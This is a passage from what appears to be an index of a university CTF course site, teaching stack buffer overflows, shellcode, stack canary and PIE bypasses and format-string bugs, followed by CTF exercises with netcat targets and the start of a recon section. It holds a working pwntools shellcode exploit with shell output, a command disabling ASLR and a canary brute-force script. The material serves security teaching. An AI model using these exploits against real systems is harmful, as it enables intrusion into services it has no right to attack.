<code>win()</code> function lying around - shellcode is a way to run your own instructions, giving you the ability to run arbitrary commands on the system.</p> <p>Shellcode is essentially assembly instructions, except we input them into the binary; once we input it, we overwrite the return pointer to hijack code execution and point at our own instructions!</p> <p>I promise you can trust me but you should never ever run shellcode without knowing what it does. Pwntools is safe and has almost all the shellcode you will ever need.</p> <p>The reason shellcode is successful is that Von Neumann architecture (the architecture used in most computers today) does not differentiate between data and instructions - it doesn't matter where or what you tell it to run, it will attempt to run it.  Therefore, even though our input is data, the computer doesn't know that - and we can use that to our advantage.</p> <p>Shellcodeshellcode.zip - 3KB</p>"},{"location":"CS315/2021/Week%202/#disabling-aslr","title":"Disabling ASLR","text":"<p>ASLR is a security technique, and while it is not specifically designed to combat shellcode, it involves randomising certain aspects of memory (we will talk about it in much more detail later). This randomisation can make shellcode exploits like the one we're about to do more less reliable, so we'll be disabling it for now using this.</p> <pre><code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space\n</code></pre> <p>Again, you should never run commands if you don't know what they do</p>"},{"location":"CS315/2021/Week%202/#finding-the-buffer-in-memory","title":"Finding the Buffer in Memory","text":"<p>Let's debug <code>vuln()</code> using <code>radare2</code> and work out where in memory the buffer starts; this is where we want to point the return pointer to.</p> <pre><code>$ r2 -d -A vuln\n[0xf7fd40b0]&gt; s sym.unsafe ; pdf[...]; var int32_t var_134h @ ebp-0x134[...]\n</code></pre> <p>This value that gets printed out is a local variable - due to its size, it's fairly likely to be the buffer. Let's set a breakpoint just after <code>gets()</code> and find the exact address.</p> <pre><code>[0x08049172]&gt; dcOverflow me&lt;&lt;Found me&gt;&gt;                    &lt;== This was my inputhit breakpoint at: 80491a8[0x080491a8]&gt; px @ ebp - 0x134- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF0xffffcfb4  3c3c 466f 756e 6420 6d65 3e3e 00d1 fcf7  &lt;&lt;Found me&gt;&gt;....\n[...]\n</code></pre> <p>It appears to be at <code>0xffffcfd4</code>; if we run the binary multiple times, it should remain where it is (if it doesn't, make sure ASLR is disabled!).</p>"},{"location":"CS315/2021/Week%202/#finding-the-padding","title":"Finding the Padding","text":"<p>Now we need to calculate the padding until the return pointer. We'll use the De Bruijn sequence as explained in the previous blog post.</p> <pre><code>$ ragg2 -P 400 -r&lt;copy this&gt;\n$ r2 -d -A vuln[0xf7fd40b0]&gt; dcOverflow me&lt;&lt;paste here&gt;&gt;[0x73424172]&gt; wopO `dr eip`312\n</code></pre> <p>The padding is 312 bytes.</p>"},{"location":"CS315/2021/Week%202/#putting-it-all-together","title":"Putting it all together","text":"<p>In order for the shellcode to be correct, we're going to set <code>context.binary</code> to our binary; this grabs stuff like the arch, OS and bits and enables pwntools to provide us with working shellcode.</p> <pre><code>from pwn import *\ncontext.binary = ELF('./vuln')\np = process()\n</code></pre> <p>We can use just <code>process()</code> because once <code>context.binary</code> is set it is assumed to use that process</p> <p>Now we can use pwntools' awesome shellcode functionality to make it incredibly simple.</p> <pre><code>payload = asm(shellcraft.sh())          # The shellcode\npayload = payload.ljust(312, b'A')      # Padding\npayload += p32(0xffffcfb4)              # Address of the Shellcode\n</code></pre> <p>Yup, that's it. Now let's send it off and use <code>p.interactive()</code>, which enables us to communicate to the shell.</p> <pre><code>log.info(p.clean())\np.sendline(payload)\np.interactive()\n</code></pre> <p>If you're getting an <code>EOFError</code>, print out the shellcode and try to find it in memory - the stack address may be wrong</p> <pre><code>$ python3 exploit.py\n[*] 'vuln'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x8048000)\n    RWX:      Has RWX segments\n[+] Starting local process 'vuln': pid 3606\n[*] Overflow me\n[*] Switching to interactive mode\n$ whoami\nironstone\n$ ls\nexploit.py  source.c  vuln\n</code></pre> <p>And it works! Awesome.</p>"},{"location":"CS315/2021/Week%202/#final-exploit","title":"Final Exploit","text":"<pre><code>from pwn import *\ncontext.binary = ELF('./vuln')\np = process()\npayload = asm(shellcraft.sh())\n# The shellcodepayload = payload.ljust(312, b'A')\n# Paddingpayload += p32(0xffffcfb4)\n# Address of the Shellcode\nlog.info(p.clean())\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"CS315/2021/Week%202/#find-shellcode-online","title":"Find Shellcode Online","text":"<p>There are some online resources for shellcode. Sometimes the program runs input check that some characters are filtered. Using online database or pwntool's shellcode generator are both fine.</p> <p>Shellcode database: http://shell-storm.org/shellcode/</p> <p>According to the different CPU architecture and operating system, you may need different shellcode.</p>"},{"location":"CS315/2021/Week%202/#exercise","title":"Exercise","text":""},{"location":"CS315/2021/Week%202/#5-pt-smash-the-stack","title":"(5 pt) Smash the stack","text":"<p>After three days of staying up to finish deadline, you feel extremely tired. Wanna to buy some coffee, you step out room and walking to the store. Tired, exhausted, and thinking about the difficult challenge, without seeing the truck that rushing directly to you...</p> <p>When light appears, a goddess whos so beautiful standing in front of you, said, \"Now, you are selected to re-born in the fantasy world.\"</p> <p>\"Help us to fight dragon the world destroyer, and save this world plz!\" Said the goddess. \"You have ONE chance to make a vow, and I'll make it true.\"</p> <p>\"By the way, if you put something that I can't handle, I'll give you a <code>flag</code>!\"</p> <p><code>nc ali.infury.org 10001</code></p> <p>goddess</p> <p>goddess.c</p> <p>Hack the goddess and find flag. Flag format: <code>flag{***}</code></p>"},{"location":"CS315/2021/Week%202/#5-pt-check-and-overlap","title":"(5 pt) Check and overlap","text":"<p>Because of the goddess got stuck when processing, so you finally didn't get any special power. After fighting for days, you reach the \"end castle\" and ready to terminate \"dragon the destroyer\" by yourself.</p> <p>\"You, a mere human. How dare you to challenge me!\" Said the dragon, who has indestructible scale and powerful skin that resists to all magic.</p> <p>\"Only using the ancient legendary weapons that you can hurt me. However, those powers are unreachable and you can't assign value to them.\"</p> <p>\"Now, what's your last word?\"</p> <p><code>nc ali.infury.org 10002</code></p> <p>dragon</p> <p>dragon.c</p> <p>Fight the dragon and find flag. Flag format: <code>flag{***}</code></p>"},{"location":"CS315/2021/Week%202/#bonus-5-pt-perfectly-secure-from-shellcode","title":"(BONUS 5 pt) Perfectly secure from shellcode","text":"<p>The dragon fell down into dust. You become the hero of the fantasy world. However, you still want to return home.</p> <p>\"Only the God can leave this world.\" Said the wiser, \"that dragon is the most powerful creature and the most close to the God. Maybe... Only maybe... There is only one way.\"</p> <p>\"Grab the dragon's egg, use it to caste the most powerful wish magic. You have a chance to say something to the world tree.\"</p> <p>\"However, you may only use characters no smaller than 32, no larger than 126 in ASCII order. May the bless be with you!\"</p> <p>The end of journey is arriving.</p> <p>You are filled with determination.</p> <p><code>nc ali.infury.org 10003</code></p> <p>world</p> <p>world.c</p> <p>Become the God and find the flag. Flag format: <code>flag{***}</code></p>"},{"location":"CS315/2021/Week%203/","title":"Week3 PWN: Advanced Buffer Overflow","text":"<p>According to the @CTF101: https://ctf101.org/</p>"},{"location":"CS315/2021/Week%203/#binary-exploitation","title":"Binary Exploitation","text":"<p>Binaries, or executables, are machine code for a computer to execute. For the most part, the binaries that you will face in CTFs are Linux ELF files or the occasional windows executable. Binary Exploitation is a broad topic within Cyber Security which really comes down to finding a vulnerability in the program and exploiting it to gain control of a shell or modifying the program's functions.</p> <p>Common topics addressed by Binary Exploitation or 'pwn' challenges include:</p> <ul> <li>Registers</li> <li>The Stack</li> <li>Calling Conventions</li> <li>Global Offset Table (GOT)</li> <li>Buffers</li> <li>Buffer Overflow</li> <li>Return Oriented Programming (ROP)</li> <li>Binary Security</li> <li>No eXecute (NX)</li> <li>Address Space Layout Randomization (ASLR)</li> <li>Stack Canaries</li> <li>Relocation Read-Only (RELRO)</li> <li>The Heap</li> <li>Heap Exploitation</li> <li>Format String Vulnerability</li> </ul>"},{"location":"CS315/2021/Week%203/#the-stack","title":"The Stack","text":"<p>In computer architecture, the stack is a hardware manifestation of the stack data structure (a Last In, First Out queue).</p> <p>In x86, the stack is simply an area in RAM that was chosen to be the stack - there is no special hardware to store stack contents. The <code>esp</code>/<code>rsp</code> register holds the address in memory where the bottom of the stack resides. When something is <code>push</code>ed to the stack, <code>esp</code> decrements by 4 (or 8 on 64-bit x86), and the value that was <code>push</code>ed is stored at that location in memory. Likewise, when a <code>pop</code> instruction is executed, the value at <code>esp</code> is retrieved (i.e. <code>esp</code> is dereferenced), and <code>esp</code> is then incremented by 4 (or 8).</p> <p>N.B. The stack \"grows\" down to lower memory addresses!</p> <p>Conventionally, <code>ebp</code>/<code>rbp</code> contains the address of the top of the current stack frame, and so sometimes local variables are referenced as an offset relative to <code>ebp</code> rather than an offset to <code>esp</code>. A stack frame is essentially just the space used on the stack by a given function.</p>"},{"location":"CS315/2021/Week%203/#uses","title":"Uses","text":"<p>The stack is primarily used for a few things:</p> <ul> <li>Storing function arguments</li> <li>Storing local variables</li> <li>Storing processor state between function calls</li> </ul>"},{"location":"CS315/2021/Week%203/#example","title":"Example","text":"<p>Let's see what the stack looks like right after <code>say_hi</code> has been called in this 32-bit x86 C program:</p> <pre><code>#include &lt;stdio.h&gt;\n\nvoid say_hi(const char * name) {\n    printf(\"Hello %s!\\n\", name);\n}\n\nint main(int argc, char ** argv) {\n    char * name;\n    if (argc != 2) {\n        return 1;\n    }\n    name = argv[1];\n    say_hi(name);\n    return 0;\n}\n</code></pre> <p>And the relevant assembly:</p> <pre><code>0804840b &lt;say_hi&gt;:\n 804840b:   55                      push   ebp\n 804840c:   89 e5                   mov    ebp,esp\n 804840e:   83 ec 08                sub    esp,0x8\n 8048411:   83 ec 08                sub    esp,0x8\n 8048414:   ff 75 08                push   DWORD PTR [ebp+0x8]\n 8048417:   68 f0 84 04 08          push   0x80484f0\n 804841c:   e8 bf fe ff ff          call   80482e0 &lt;printf@plt&gt;\n 8048421:   83 c4 10                add    esp,0x10\n 8048424:   90                      nop\n 8048425:   c9                      leave\n 8048426:   c3                      ret\n\n08048427 &lt;main&gt;:\n 8048427:   8d 4c 24 04             lea    ecx,[esp+0x4]\n 804842b:   83 e4 f0                and    esp,0xfffffff0\n 804842e:   ff 71 fc                push   DWORD PTR [ecx-0x4]\n 8048431:   55                      push   ebp\n 8048432:   89 e5                   mov    ebp,esp\n 8048434:   51                      push   ecx\n 8048435:   83 ec 14                sub    esp,0x14\n 8048438:   89 c8                   mov    eax,ecx\n 804843a:   83 38 02                cmp    DWORD PTR [eax],0x2\n 804843d:   74 07                   je     8048446 &lt;main+0x1f&gt;\n 804843f:   b8 01 00 00 00          mov    eax,0x1\n 8048444:   eb 1c                   jmp    8048462 &lt;main+0x3b&gt;\n 8048446:   8b 40 04                mov    eax,DWORD PTR [eax+0x4]\n 8048449:   8b 40 04                mov    eax,DWORD PTR [eax+0x4]\n 804844c:   89 45 f4                mov    DWORD PTR [ebp-0xc],eax\n 804844f:   83 ec 0c                sub    esp,0xc\n 8048452:   ff 75 f4                push   DWORD PTR [ebp-0xc]\n 8048455:   e8 b1 ff ff ff          call   804840b &lt;say_hi&gt;\n 804845a:   83 c4 10                add    esp,0x10\n 804845d:   b8 00 00 00 00          mov    eax,0x0\n 8048462:   8b 4d fc                mov    ecx,DWORD PTR [ebp-0x4]\n 8048465:   c9                      leave\n 8048466:   8d 61 fc                lea    esp,[ecx-0x4]\n 8048469:   c3                      ret\n</code></pre> <p>Skipping over the bulk of <code>main</code>, you'll see that at <code>0x8048452</code> <code>main</code>'s <code>name</code> local is pushed to the stack because it's the first argument to <code>say_hi</code>. Then, a <code>call</code> instruction is executed. <code>call</code> instructions first push the current instruction pointer to the stack, then jump to their destination. So when the processor begins executing <code>say_hi</code> at <code>0x0804840b</code>, the stack looks like this:</p> <pre><code>EIP = 0x0804840b (push ebp)\nESP = 0xffff0000\nEBP = 0xffff002c\n\n        0xffff0004: 0xffffa0a0              // say_hi argument 1\nESP -&gt;  0xffff0000: 0x0804845a              // Return address for say_hi\n</code></pre> <p>The first thing <code>say_hi</code> does is save the current <code>ebp</code> so that when it returns, <code>ebp</code> is back where <code>main</code> expects it to be. The stack now looks like this:</p> <pre><code>EIP = 0x0804840c (mov ebp, esp)\nESP = 0xfffefffc\nEBP = 0xffff002c\n\n        0xffff0004: 0xffffa0a0              // say_hi argument 1\n        0xffff0000: 0x0804845a              // Return address for say_hi\nESP -&gt;  0xfffefffc: 0xffff002c              // Saved EBP\n</code></pre> <p>Again, note how <code>esp</code> gets smaller when values are pushed to the stack.</p> <p>Next, the current <code>esp</code> is saved into <code>ebp</code>, marking the top of the new stack frame.</p> <pre><code>EIP = 0x0804840e (sub esp, 0x8)\nESP = 0xfffefffc\nEBP = 0xfffefffc\n\n            0xffff0004: 0xffffa0a0              // say_hi argument 1\n            0xffff0000: 0x0804845a              // Return address for say_hi\nESP, EBP -&gt; 0xfffefffc: 0xffff002c              // Saved EBP\n</code></pre> <p>Then, the stack is \"grown\" to accommodate local variables inside <code>say_hi</code>.</p> <pre><code>EIP = 0x08048414 (push [ebp + 0x8])\nESP = 0xfffeffec\nEBP = 0xfffefffc\n\n        0xffff0004: 0xffffa0a0              // say_hi argument 1\n        0xffff0000: 0x0804845a              // Return address for say_hi\nEBP -&gt;  0xfffefffc: 0xffff002c              // Saved EBP\n        0xfffefff8: UNDEFINED\n        0xfffefff4: UNDEFINED\n        0xfffefff0: UNDEFINED\nESP -&gt;  0xfffefffc: UNDEFINED\n</code></pre> <p>NOTE: stack space is not implictly cleared!</p> <p>Now, the 2 arguments to <code>printf</code> are pushed in reverse order.</p> <pre><code>EIP = 0x0804841c (call printf@plt)\nESP = 0xfffeffe4\nEBP = 0xfffefffc\n\n        0xffff0004: 0xffffa0a0              // say_hi argument 1\n        0xffff0000: 0x0804845a              // Return address for say_hi\nEBP -&gt;  0xfffefffc: 0xffff002c              // Saved EBP\n        0xfffefff8: UNDEFINED\n        0xfffefff4: UNDEFINED\n        0xfffefff0: UNDEFINED\n        0xfffeffec: UNDEFINED\n        0xfffeffe8: 0xffffa0a0              // printf argument 2\nESP -&gt;  0xfffeffe4: 0x080484f0              // printf argument 1\n</code></pre> <p>Finally, <code>printf</code> is called, which pushes the address of the next instruction to execute.</p> <pre><code>EIP = 0x080482e0\nESP = 0xfffeffe4\nEBP = 0xfffefffc\n\n        0xffff0004: 0xffffa0a0              // say_hi argument 1\n        0xffff0000: 0x0804845a              // Return address for say_hi\nEBP -&gt;  0xfffefffc: 0xffff002c              // Saved EBP\n        0xfffefff8: UNDEFINED\n        0xfffefff4: UNDEFINED\n        0xfffefff0: UNDEFINED\n        0xfffeffec: UNDEFINED\n        0xfffeffe8: 0xffffa0a0              // printf argument 2\n        0xfffeffe4: 0x080484f0              // printf argument 1\nESP -&gt;  0xfffeffe0: 0x08048421              // Return address for printf\n</code></pre> <p>Once <code>printf</code> has returned, the <code>leave</code> instruction moves <code>ebp</code> into <code>esp</code>, and pops the saved EBP.</p> <pre><code>EIP = 0x08048426 (ret)\nESP = 0xfffefffc\nEBP = 0xffff002c\n\n        0xffff0004: 0xffffa0a0              // say_hi argument 1\nESP -&gt;  0xffff0000: 0x0804845a              // Return address for say_hi\n</code></pre> <p>And finally, <code>ret</code> pops the saved instruction pointer into <code>eip</code> which causes the program to return to main with the same <code>esp</code>, <code>ebp</code>, and stack contents as when <code>say_hi</code> was initially called.</p> <pre><code>EIP = 0x0804845a (add esp, 0x10)\nESP = 0xffff0000\nEBP = 0xffff002c\n\nESP -&gt;  0xffff0004: 0xffffa0a0              // say_hi argument 1\n</code></pre>"},{"location":"CS315/2021/Week%203/#calling-conventions","title":"Calling Conventions","text":"<p>To be able to call functions, there needs to be an agreed-upon way to pass arguments. If a program is entirely self-contained in a binary, the compiler would be free to decide the calling convention. However in reality, shared libraries are used so that common code (e.g. libc) can be stored once and dynamically linked in to programs that need it, reducing program size.</p> <p>In Linux binaries, there are really only two commonly used calling conventions: cdecl for 32-bit binaries, and SysV for 64-bit</p>"},{"location":"CS315/2021/Week%203/#cdecl","title":"cdecl","text":"<p>In 32-bit binaries on Linux, function arguments are passed in on the stack in reverse order. A function like this:</p> <pre><code>int add(int a, int b, int c) {\n    return a + b + c;\n}\n</code></pre> <p>would be invoked by pushing <code>c</code>, then <code>b</code>, then <code>a</code>.</p>"},{"location":"CS315/2021/Week%203/#sysv","title":"SysV","text":"<p>For 64-bit binaries, function arguments are first passed in certain registers:</p> <ol> <li>RDI</li> <li>RSI</li> <li>RDX</li> <li>RCX</li> <li>R8</li> <li>R9</li> </ol> <p>then any leftover arguments are pushed onto the stack in reverse order, as in cdecl.</p>"},{"location":"CS315/2021/Week%203/#other-conventions","title":"Other Conventions","text":"<p>Any method of passing arguments could be used as long as the compiler is aware of what the convention is. As a result, there have been many calling conventions in the past that aren't used frequently anymore. See Wikipedia for a comprehensive list.</p>"},{"location":"CS315/2021/Week%203/#binary-security","title":"Binary Security","text":"<p>Binary Security is using tools and methods in order to secure programs from being manipulated and exploited. This tools are not infallible, but when used together and implemented properly, they can raise the difficulty of exploitation greatly.</p>"},{"location":"CS315/2021/Week%203/#no-execute-nx-bit","title":"No eXecute (NX Bit)","text":"<p>The No eXecute or the NX bit (also known as Data Execution Prevention or DEP) marks certain areas of the program as not executable, meaning that stored input or data cannot be executed as code. This is significant because it prevents attackers from being able to jump to custom shellcode that they've stored on the stack or in a global variable.</p>"},{"location":"CS315/2021/Week%203/#checking-for-nx","title":"Checking for NX","text":"<p>You can either use pwntools' <code>checksec</code> or <code>rabin2</code>.</p> <pre><code>$ checksec vuln\n[*] 'vuln'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x8048000)\n    RWX:      Has RWX segments\n</code></pre> <pre><code>$ rabin2 -I vuln\n[...]\nnx       false\n[...]\n</code></pre>"},{"location":"CS315/2021/Week%203/#address-space-layout-randomization-aslr","title":"Address Space Layout Randomization (ASLR)","text":"<p>Address Space Layout Randomization (or ASLR) is the randomization of the place in memory where the program, shared libraries, the stack, and the heap are. This makes can make it harder for an attacker to exploit a service, as knowledge about where the stack, heap, or libc can't be re-used between program launches. This is a partially effective way of preventing an attacker from jumping to, for example, libc without a leak.</p> <p>Typically, only the stack, heap, and shared libraries are ASLR enabled. It is still somewhat rare for the main program to have ASLR enabled, though it is being seen more frequently and is slowly becoming the default.</p>"},{"location":"CS315/2021/Week%203/#stack-canaries","title":"Stack Canaries","text":"<p>Stack Canaries are a secret value placed on the stack which changes every time the program is started. Prior to a function return, the stack canary is checked and if it appears to be modified, the program exits immeadiately.</p> <p></p>"},{"location":"CS315/2021/Week%203/#bypassing-stack-canaries","title":"Bypassing Stack Canaries","text":"<p>Stack Canaries seem like a clear cut way to mitigate any stack smashing as it is fairly impossible to just guess a random 64-bit value. However, leaking the address and bruteforcing the canary are two methods which would allow us to get through the canary check.</p>"},{"location":"CS315/2021/Week%203/#stack-canary-leaking","title":"Stack Canary Leaking","text":"<p>If we can read the data in the stack canary, we can send it back to the program later because the canary stays the same throughout execution. However Linux makes this slightly tricky by making the first byte of the stack canary a NULL, meaning that string functions will stop when they hit it. A method around this would be to partially overwrite and then put the NULL back or find a way to leak bytes at an arbitrary stack offset.</p> <p>A few situations where you might be able to leak a canary:</p> <ul> <li>User-controlled format string</li> <li>User-controlled length of an output</li> <li>\u201cHey, can you send me 1000000 bytes? thx!\u201d</li> </ul>"},{"location":"CS315/2021/Week%203/#bruteforcing-a-stack-canary","title":"Bruteforcing a Stack Canary","text":"<p>The canary is determined when the program starts up for the first time which means that if the program forks, it keeps the same stack cookie in the child process. This means that if the input that can overwrite the canary is sent to the child, we can use whether it crashes as an oracle and brute-force 1 byte at a time!</p> <p>This method can be used on fork-and-accept servers where connections are spun off to child processes, but only under certain conditions such as when the input accepted by the program does not append a NULL byte (read or recv).</p> Buffer (N Bytes) ?? ?? ?? ?? ?? ?? ?? ?? RBP RIP <p>Fill the buffer N Bytes + 0x00 results in no crash</p> Buffer (N Bytes) 00 ?? ?? ?? ?? ?? ?? ?? RBP RIP <p>Fill the buffer N Bytes + 0x00 + 0x00 results in a crash</p> <p>N Bytes + 0x00 + 0x01 results in a crash</p> <p>N Bytes + 0x00 + 0x02 results in a crash</p> <p>...</p> <p>N Bytes + 0x00 + 0x51 results in no crash</p> Buffer (N Bytes) 00 51 ?? ?? ?? ?? ?? ?? RBP RIP <p>Repeat this bruteforcing process for 6 more bytes...</p> Buffer (N Bytes) 00 51 FE 0A 31 D2 7B 3C RBP RIP <p>Now that we have the stack cookie, we can overwrite the RIP register and take control of the program!</p>"},{"location":"CS315/2021/Week%203/#relocation-read-only-relro","title":"Relocation Read-Only (RELRO)","text":"<p>Relocation Read-Only (or RELRO) is a security measure which makes some binary sections read-only.</p> <p>There are two RELRO \"modes\": partial and full.</p>"},{"location":"CS315/2021/Week%203/#partial-relro","title":"Partial RELRO","text":"<p>Partial RELRO is the default setting in GCC, and nearly all binaries you will see have at least partial RELRO.</p> <p>From an attackers point-of-view, partial RELRO makes almost no difference, other than it forces the GOT to come before the BSS in memory, eliminating the risk of a buffer overflows on a global variable overwriting GOT entries.</p>"},{"location":"CS315/2021/Week%203/#full-relro","title":"Full RELRO","text":"<p>Full RELRO makes the entire GOT read-only which removes the ability to perform a \"GOT overwrite\" attack, where the GOT address of a function is overwritten with the location of another function or a ROP gadget an attacker wants to run.</p> <p>Full RELRO is not a default compiler setting as it can greatly increase program startup time since all symbols must be resolved before the program is started. In large programs with thousands of symbols that need to be linked, this could cause a noticable delay in startup time.</p>"},{"location":"CS315/2021/Week%203/#bypassing-canary-pie","title":"Bypassing Canary &amp; PIE","text":"<p>If you are facing a binary protected by a canary and PIE (Position Independent Executable) you probably need to find a way to bypass them.</p> <p></p>"},{"location":"CS315/2021/Week%203/#canary","title":"Canary","text":"<p>The best way to bypass a simple canary is if the binary is a program forking child processes every time you establish a new connection with it (network service), because every time you connect to it the same canary will be used.</p> <p>Then, the best way to bypass the canary is just to brute-force it char by char, and you can figure out if the guessed canary byte was correct checking if the program has crashed or continues its regular flow. In this example the function brute-forces an 8 Bytes canary (x64) and distinguish between a correct guessed byte and a bad byte just checking if a response is sent back by the server (another way in other situation could be using a try/except):</p> <pre><code>from pwn import *\n\ndef connect():\n    r = remote(\"localhost\", 8788)\n\ndef get_bf(base):\n    canary = \"\"\n    guess = 0x0\n    base += canary\n\n    while len(canary) &lt; 8:\n        while guess != 0xff:\n            r = connect()\n\n            r.recvuntil(\"Username: \")\n            r.send(base + chr(guess))\n\n            if \"SOME OUTPUT\" in r.clean():\n                print \"Guessed correct byte:\", format(guess, '02x')\n                canary += chr(guess)\n                base += chr(guess)\n                guess = 0x0\n                r.close()\n                break\n            else:\n                guess += 1\n                r.close()\n\n    print \"FOUND:\\\\x\" + '\\\\x'.join(\"{:02x}\".format(ord(c)) for c in canary)\n    return base\n\ncanary_offset = 1176\nbase = \"A\" * canary_offset\nprint(\"Brute-Forcing canary\")\nbase_canary = get_bf(base) #Get yunk data + canary\nCANARY = u64(base_can[len(base_canary)-8:]) #Get the canary\n</code></pre>"},{"location":"CS315/2021/Week%203/#pie","title":"PIE","text":"<p>In order to bypass the PIE you need to leak some address. And if the binary is not leaking any addresses the best to do it is to brute-force the RBP and RIP saved in the stack in the vulnerable function. For example, if a binary is protected using both a canary and PIE, you can start brute-forcing the canary, then the next 8 Bytes (x64) will be the saved RBP and the next 8 Bytes will be the saved RIP.</p> <p>To brute-force the RBP and the RIP from the binary you can figure out that a valid guessed byte is correct if the program output something or it just doesn't crash. The same function as the provided for brute-forcing the canary can be used to brute-force the RBP and the RIP:</p> <pre><code>print(\"Brute-Forcing RBP\")\nbase_canary_rbp = get_bf(base_canary)\nRBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])\nprint(\"Brute-Forcing RIP\")\nbase_canary_rbp_rip = get_bf(base_canary_rbp)\nRIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])\n</code></pre>"},{"location":"CS315/2021/Week%203/#get-base-address","title":"Get base address","text":"<p>The last thing you need to defeat the PIE is to calculate useful addresses from the leaked addresses: the RBP and the RIP.</p> <p>From the RBP you can calculate where are you writing your shell in the stack. This can be very useful to know where are you going to write the string \"/bin/sh\\x00\" inside the stack. To calculate the distance between the leaked RBP and your shellcode you can just put a breakpoint after leaking the RBP an check where is your shellcode located, then, you can calculate the distance between the shellcode and the RBP:</p> <pre><code>INI_SHELLCODE = RBP - 1152\n</code></pre> <p>From the RIP you can calculate the base address of the PIE binary which is what you are going to need to create a valid ROP chain. To calculate the base address just do <code>objdump -d vunbinary</code> and check the disassemble latest addresses:</p> <p></p> <p>In that example you can see that only 1 Byte and a half is needed to locate all the code, then, the base address in this situation will be the leaked RIP but finishing on \"000\". For example if you leaked 0x562002970ecf the base address is 0x562002970**000</p> <pre><code>elf.address = RIP - (RIP &amp; 0xfff)\n</code></pre>"},{"location":"CS315/2021/Week%203/#format-string-vulnerability","title":"Format String Vulnerability","text":"<p>A format string vulnerability is a bug where user input is passed as the format argument to <code>printf</code>, <code>scanf</code>, or another function in that family.</p> <p>The format argument has many different specifies which could allow an attacker to leak data if they control the format argument to <code>printf</code>. Since <code>printf</code> and similar are variadic functions, they will continue popping data off of the stack according to the format.</p> <p>For example, if we can make the format argument \"%x.%x.%x.%x\", <code>printf</code> will pop off four stack values and print them in hexadecimal, potentially leaking sensitive information.</p> <p><code>printf</code> can also index to an arbitrary \"argument\" with the following syntax: \"%n$x\" (where <code>n</code> is the decimal index of the argument you want).</p> <p>While these bugs are powerful, they're very rare nowadays, as all modern compilers warn when <code>printf</code> is called with a non-constant string.</p>"},{"location":"CS315/2021/Week%203/#example_1","title":"Example","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nint main() {\n    int secret_num = 0x8badf00d;\n\n    char name[64] = {0};\n    read(0, name, 64);\n    printf(\"Hello \");\n    printf(name);\n    printf(\"! You'll never get my secret!\\n\");\n    return 0;\n}\n</code></pre> <p>Due to how GCC decided to lay out the stack, <code>secret_num</code> is actually at a lower address on the stack than <code>name</code>, so we only have to go to the 7th \"argument\" in <code>printf</code> to leak the secret:</p> <pre><code>$ ./fmt_string\n%7$llx\nHello 8badf00d3ea43eef\n! You'll never get my secret!\n</code></pre>"},{"location":"CS315/2021/Week%203/#exercise","title":"Exercise","text":""},{"location":"CS315/2021/Week%203/#5-pt-gimme-the-report-the-boss-said","title":"(5 pt) \"Gimme the report.\" The Boss said","text":"<p>CS315 course is open, and this year we added some CTF challenges to the lab tutorial. After 3 weeks of teaching, our professor wants some feedback from students.</p> <p>\"Design a service, please. Gather some feedback and report from students of CS315.\"</p> <p>\"Sure.\" Answered in no time, but I got super nervous because of me, as a computer science graduate, don't know how to programming.</p> <p></p> <p>By the way, I already got some report said that <code>why this course so easy</code>, <code>please tell something hard</code>. Fine, I'll just write my program that reads from user input, but stores nothing.</p> <p>No store, no vulnerability.</p> <p>Yeah, I'm going to save my job!</p> <p>my_super_secret_report_service</p> <p>my_super_secret_report_service.c</p> <p><code>nc ali.infury.org 10004</code></p>"},{"location":"CS315/2021/Week%203/#5-pt-my-last-chance","title":"(5 pt) My Last Chance","text":"<p>It's super hard to convince my Boss that report system is just broken temporarily. Now I'm going to learn programming and security very hard to save my job.</p> <p>---- 2 DAYS LATER ----</p> <p>Totally didn't learn.</p> <p>\"Some students want to enroll this course, please make something to collect enroll.\"</p> <p>\"But, but this course is full already...\"</p> <p>\"CS315 is hard, someone gonna to quit. So, in case anyone want to enroll, we need to handle this.\" The Boss looked at me, \"can't you programming?\"</p> <p>\"Yep! Yeah, seriously I can programming very well!\"</p> <p>I need to prepare my CV now.</p> <p>awesome_enroll_service</p> <p>awesome_enroll_service.c</p> <p><code>nc ali.infury.org 10005</code></p> <p>Please use netcat to connect and solve challenges! And don't ask why there isn't a flag.txt in source code...</p>"},{"location":"CS315/2021/Week%203/#bonus-5-pt-me-worked-in-maid-cafes","title":"(BONUS 5 pt) Me, worked in maid cafes","text":"<p>Yet another programming order from cafes.</p> <p>So called maid cafes, their Boss wants me to design a service to collect costumers' requirements.</p> <p>The Boss promised me if I can finish such a program, I can come to the cafes free forever. So stuck in the flavor of coffee (not the maid I promise) that I swear gonna to get this work done.</p> <p>Very strange I don't understand the details of this program (like how big, how far, which requirements are they?), and why some CS315 students are pentesting my program.</p> <p>Luckily I learned about some security parameters already, so I simply turned them on.</p> <p>maid</p> <p>ld-linux-x86-64.so.2</p> <p>libc.so.6</p> <p>This is a ROP challenge and you may find it's difficult. But success solvers will win a badge.</p>"},{"location":"CS315/2021/Week%204/","title":"Week4 WEB: Information Discovery","text":"<p>According to @d00mfist: https://d00mfist.gitbooks.io/ctf/content/</p>"},{"location":"CS315/2021/Week%204/#information-discovery","title":"Information Discovery","text":"<p>So once you have decided on a target you want to start your recon-process.</p> <p>The recon-phase is usually divided up into two phases.</p> <ol> <li>Passive information gathering / OSINT This is when you check out stuff like:</li> <li>Web information</li> <li>Email Harvesting</li> <li>Whois enumeration</li> <li>Active information gathering</li> </ol> <p>This is when you start scanning the target with your different tools.</p>"},{"location":"CS315/2021/Week%204/#passive-information-gathering","title":"Passive information gathering","text":"<p>It is passive in the meaning that it doesn't directly send packets to the service. But in any other sense of the word there is nothing passive about this phase.</p>"},{"location":"CS315/2021/Week%204/#visit-the-website","title":"Visit the website","text":"<p>Okay, I guess this actually sends packets to the target, but whatever. Visit the page, look around, read about the target. What do they do?</p>"},{"location":"CS315/2021/Week%204/#whois","title":"Whois","text":"<p>Find out who is behind the website.</p> <p>Resolve the DNS</p> <pre><code>host website.com\nnslookup website.com\n</code></pre> <p>The the IP address and check it with <code>whois</code></p> <pre><code>whois 